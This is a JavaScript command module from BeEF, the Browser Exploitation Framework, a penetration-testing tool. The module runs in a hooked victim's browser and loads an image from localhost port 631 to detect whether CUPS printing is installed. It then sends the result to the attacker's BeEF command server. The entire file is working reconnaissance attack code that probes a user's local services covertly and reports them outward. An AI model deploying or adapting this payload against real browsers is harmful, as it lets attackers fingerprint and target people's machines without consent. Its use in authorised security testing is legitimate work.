//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {

	var result = "Not Installed";
	var dom = document.createElement('b');
	var img = new Image;
	img.src = "http://127.0.0.1:631/images/cups-icon.png";
	img.onload = function() {
		if (this.width == 128 && this.height == 128) result="Installed";
		beef.net.send('<%= @command_url %>', <%= @command_id %>,'cups='+result);
		dom.removeChild(this);
	}
	img.onerror = function() {
		beef.net.send('<%= @command_url %>', <%= @command_id %>,'cups='+result);
		dom.removeChild(this);
	}
	dom.appendChild(img);

});

